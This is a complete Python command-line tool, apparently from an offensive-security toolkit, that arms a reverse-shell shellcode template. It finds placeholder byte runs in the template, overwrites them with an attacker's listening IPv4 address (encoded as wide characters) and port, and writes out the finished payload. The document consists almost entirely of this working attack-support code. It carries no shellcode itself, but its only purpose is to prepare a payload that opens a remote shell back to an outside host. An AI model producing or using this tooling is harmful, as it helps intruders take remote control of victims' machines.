#!/usr/bin/python3
import ipaddress
import os
import argparse

# convert a python string to a wchar_t array
def toWchar(toConvert: str) -> bytes:
    return b"".join([c.encode("utf-8") + b'\x00' for c in toConvert])

def parse() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
                    prog='prepareShellcode',
                    description='Insert listening Host and Port into reverse shell shellcode',
                    epilog='Supports only IPv4 Host')
    
    parser.add_argument("-sh", "--shellcodeTemplate", action="store", type=str, required=True,help="Path to shellcode template")
    parser.add_argument("-H", "--lHost", action="store", type=str, required=True, help="IPv4 of host listening for reverse shell")
    parser.add_argument("-p", "--lPort", action="store", type=int, required=True, help="Port in the host listening for reverse shell")
    parser.add_argument("-o", "--output", action="store", type=str, required=True, help="Path to shellcode produced shellcode")
    return parser.parse_args()

def main():
    args = parse()
    
    shellcodeTemplate = os.path.abspath(args.shellcodeTemplate)
    try:
        ipaddress.ip_address(args.lHost)
    except ValueError:
        print(f"[!] Wrong IP format: {args.lHost}")
        exit(1)
    lHost = toWchar(args.lHost)
    if (args.lPort < 1 or args.lPort > 65535):
        print(f"[!] Invalid port: {args.lPort}")
        exit(1)
    output = os.path.abspath(args.output)

    with open(shellcodeTemplate, "rb") as fIn:
        shellcode = fIn.read()
    
    # locate offset of lHost placeholder
    lHostOff = shellcode.find(b"\xaa\xaa"*16)
    # locate offset of lPort placeholder
    lPortOff =  lHostOff + shellcode[lHostOff:].find(b"\xbb\xbb")
    # build the new shellcode patching the placeholder bytes with lHost and lPort
    shellcode = shellcode[:lHostOff] + lHost.ljust(32, b'\x00') + shellcode[lHostOff+32:lPortOff] + args.lPort.to_bytes(2,byteorder="little") + shellcode[lPortOff+2:]
    
    with open(output, "wb") as fOut:
        fOut.write(shellcode)
    print(f"[+] Shellcode written to {output}")


if __name__ == "__main__":
    main()
    